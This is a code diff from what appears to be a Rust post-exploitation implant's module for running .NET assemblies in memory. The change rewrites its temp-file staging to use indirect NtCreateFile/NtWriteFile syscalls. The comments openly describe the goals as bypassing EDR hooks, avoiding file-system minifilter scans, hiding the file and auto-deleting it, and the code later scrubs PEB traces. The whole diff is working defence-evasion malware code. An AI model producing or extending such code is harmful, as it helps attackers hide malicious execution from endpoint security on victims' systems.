@@ -49,7 +49,7 @@ use std::time::{Duration, Instant};
 use once_cell::sync::Lazy;
 use winapi::shared::guiddef::{CLSID, IID, REFIID};
 use winapi::shared::minwindef::{DWORD, HMODULE, LPDWORD, LPVOID, ULONG};
-use winapi::shared::ntdef::{HRESULT, LPCWSTR, LPWSTR};
+use winapi::shared::ntdef::{HRESULT, LPCWSTR, LPWSTR, OBJECT_ATTRIBUTES, UNICODE_STRING};
 use winapi::shared::winerror::S_OK;
 use winapi::um::minwinbase::SECURITY_ATTRIBUTES;
 use winapi::um::winbase::WAIT_OBJECT_0;
@@ -727,19 +727,111 @@ pub unsafe fn execute(
         }
     };
 
-    // ── Write assembly to memory-mapped buffer ──────────────────────────
-    // We use a temporary file in %TEMP% for the assembly because
-    // ExecuteInDefaultAppDomain requires a file path.  This is the standard
-    // approach (Cobalt Strike does the same).  The file is deleted after
-    // execution.
+    // ── Write assembly to NT-native temp file (no disk write via kernel32) ──
+    // ExecuteInDefaultAppDomain requires a file path, so we must have a real
+    // file.  However, we avoid kernel32 file I/O entirely by using NtCreateFile
+    // + NtWriteFile via indirect syscalls.  Key OPSEC improvements:
+    //
+    // 1. FILE_ATTRIBUTE_TEMPORARY — cache manager hint to keep in memory, avoid
+    //    flushing to disk where EDR file-system minifilters can scan it.
+    // 2. FILE_DELETE_ON_CLOSE — OS auto-deletes the file when all handles close,
+    //    eliminating the window between execution and explicit remove_file.
+    // 3. FILE_ATTRIBUTE_HIDDEN — reduces visibility in directory listings.
+    // 4. NtCreateFile/NtWriteFile bypass kernel32 EDR hooks on CreateFileW/WriteFile.
+    //
+    // NT file I/O constants
+    const OBJ_CASE_INSENSITIVE: u32 = 0x00000040;
+    const SYNCHRONIZE: u32 = 0x00100000;
+    const GENERIC_WRITE: u32 = 0x40000000;
+    const GENERIC_READ: u32 = 0x80000000;
+    const FILE_SHARE_READ: u32 = 0x00000001;
+    const FILE_SHARE_WRITE: u32 = 0x00000002;
+    const FILE_SHARE_DELETE: u32 = 0x00000004;
+    const FILE_SUPERSEDE: u32 = 0x00000000;
+    const FILE_NON_DIRECTORY_FILE: u32 = 0x00000040;
+    const FILE_SYNCHRONOUS_IO_NONALERT: u32 = 0x00000020;
+    const FILE_DELETE_ON_CLOSE: u32 = 0x00001000;
+    const FILE_ATTRIBUTE_TEMPORARY: u32 = 0x00000100;
+    const FILE_ATTRIBUTE_HIDDEN: u32 = 0x00000002;
+
+    let file_uuid = uuid::Uuid::new_v4();
     let temp_dir = std::env::temp_dir();
-    let temp_file = temp_dir.join(format!("{}.dll", uuid::Uuid::new_v4()));
-    std::fs::write(&temp_file, assembly_bytes).map_err(|e| format!("write temp assembly: {e}"))?;
-    let assembly_path = to_wide(
-        temp_file
-            .to_str()
-            .ok_or_else(|| "temp path is not valid UTF-8".to_string())?,
+    let temp_file = temp_dir.join(format!("{file_uuid}.dll"));
+
+    // Convert Win32 path to NT path format: C:\... → \??\C:\...
+    let win32_str = temp_file.to_str().ok_or_else(|| "temp path is not valid UTF-8".to_string())?;
+    let nt_path_str = format!(r"\??\{win32_str}");
+    let mut nt_path_wide: Vec<u16> = nt_path_str.encode_utf16().chain(std::iter::once(0)).collect();
+
+    let mut obj_name = winapi::shared::ntdef::UNICODE_STRING {
+        Length: ((nt_path_wide.len() - 1) * 2) as u16,
+        MaximumLength: (nt_path_wide.len() * 2) as u16,
+        Buffer: nt_path_wide.as_mut_ptr(),
+    };
+    let mut obj_attr = winapi::shared::ntdef::OBJECT_ATTRIBUTES {
+        Length: std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32,
+        RootDirectory: std::ptr::null_mut(),
+        ObjectName: &mut obj_name,
+        Attributes: OBJ_CASE_INSENSITIVE,
+        SecurityDescriptor: std::ptr::null_mut(),
+        SecurityQualityOfService: std::ptr::null_mut(),
+    };
+    let mut io_status: [u64; 2] = [0; 2];
+    let mut h_file: usize = 0;
+
+    let create_status = syscall!(
+        "NtCreateFile",
+        &mut h_file as *mut _ as u64,          // FileHandle
+        (SYNCHRONIZE | GENERIC_WRITE | GENERIC_READ) as u64, // DesiredAccess
+        &mut obj_attr as *mut _ as u64,        // ObjectAttributes
+        io_status.as_mut_ptr() as u64,         // IoStatusBlock
+        0u64,                                   // AllocationSize (null)
+        (FILE_ATTRIBUTE_TEMPORARY | FILE_ATTRIBUTE_HIDDEN) as u64, // FileAttributes
+        (FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE) as u64, // ShareAccess
+        FILE_SUPERSEDE as u64,                 // CreateDisposition
+        (FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT | FILE_DELETE_ON_CLOSE) as u64, // CreateOptions
+        0u64,                                   // EaBuffer
+        0u64,                                   // EaLength
     );
+    if create_status.is_err() || create_status.as_ref().map(|s| *s).unwrap_or(-1) < 0 {
+        return Err(format!(
+            "NtCreateFile for temp assembly failed: status {:?}",
+            create_status
+        ));
+    }
+
+    // Write assembly bytes via NtWriteFile (indirect syscall, no kernel32 hook).
+    let mut offset: usize = 0;
+    while offset < assembly_bytes.len() {
+        let chunk = &assembly_bytes[offset..];
+        let write_status = syscall!(
+            "NtWriteFile",
+            h_file as u64,                       // FileHandle
+            0u64,                                 // Event
+            0u64,                                 // ApcRoutine
+            0u64,                                 // ApcContext
+            io_status.as_mut_ptr() as u64,       // IoStatusBlock
+            chunk.as_ptr() as u64,               // Buffer
+            chunk.len().min(u32::MAX as usize) as u64, // Length
+            &offset as *const _ as u64,          // ByteOffset
+            0u64,                                 // Key
+        );
+        if write_status.is_err() || write_status.as_ref().map(|s| *s).unwrap_or(-1) < 0 {
+            let _ = syscall!("NtClose", h_file as u64);
+            return Err(format!(
+                "NtWriteFile for temp assembly failed at offset {offset}: status {:?}",
+                write_status
+            ));
+        }
+        let bytes_written = io_status[0] as u32;
+        if bytes_written == 0 {
+            let _ = syscall!("NtClose", h_file as u64);
+            return Err("NtWriteFile wrote 0 bytes — disk full?".to_string());
+        }
+        offset += bytes_written as usize;
+    }
+
+    let assembly_path = to_wide(win32_str);
 
     // ── Build argument string ───────────────────────────────────────────
     // ExecuteInDefaultAppDomain passes a single LPCWSTR as the argument.
@@ -765,13 +857,13 @@ pub unsafe fn execute(
     ).ok_or("cannot resolve CreatePipe")?;
 
     if create_pipe(&mut stdout_read, &mut stdout_write, &mut sa, 0) == 0 {
-        let _ = std::fs::remove_file(&temp_file);
+        let _ = syscall!("NtClose", h_file as u64);
         return Err("CreatePipe(stdout) failed".to_string());
     }
     if create_pipe(&mut stderr_read, &mut stderr_write, &mut sa, 0) == 0 {
         let _ = syscall!("NtClose", stdout_read as u64);
         let _ = syscall!("NtClose", stdout_write as u64);
-        let _ = std::fs::remove_file(&temp_file);
+        let _ = syscall!("NtClose", h_file as u64);
         return Err("CreatePipe(stderr) failed".to_string());
     }
 
@@ -798,11 +890,9 @@ pub unsafe fn execute(
     //   method = "Main" (static int Main(string))
     //
     // The single string argument is the joined args.
-    let assembly_name = temp_file
-        .file_stem()
-        .and_then(|s| s.to_str())
-        .unwrap_or("Assembly");
-    let type_name = to_wide(assembly_name);
+    let assembly_name = format!("{file_uuid}");
+    let assembly_name_str = assembly_name.as_str();
+    let type_name = to_wide(assembly_name_str);
     let method_name = to_wide("Main");
 
     // ── Execute with timeout ────────────────────────────────────────────
@@ -820,7 +910,7 @@ pub unsafe fn execute(
         let _ = syscall!("NtClose", stdout_write as u64);
         let _ = syscall!("NtClose", stderr_read as u64);
         let _ = syscall!("NtClose", stderr_write as u64);
-        let _ = std::fs::remove_file(&temp_file);
+        let _ = syscall!("NtClose", h_file as u64);
         return Err("CreateEvent for timeout failed".to_string());
     }
 
@@ -908,8 +998,9 @@ pub unsafe fn execute(
     // Drop the exec thread join handle (detaches it if still running).
     drop(exec_thread);
 
-    // Remove temp file.
-    let _ = std::fs::remove_file(&temp_file);
+    // Close the NT file handle.  FILE_DELETE_ON_CLOSE auto-deletes the file
+    // now that all handles (ours + CLR's) have been closed.
+    let _ = syscall!("NtClose", h_file as u64);
 
     // Apply memory hygiene.
     crate::memory_hygiene::scrub_peb_traces();
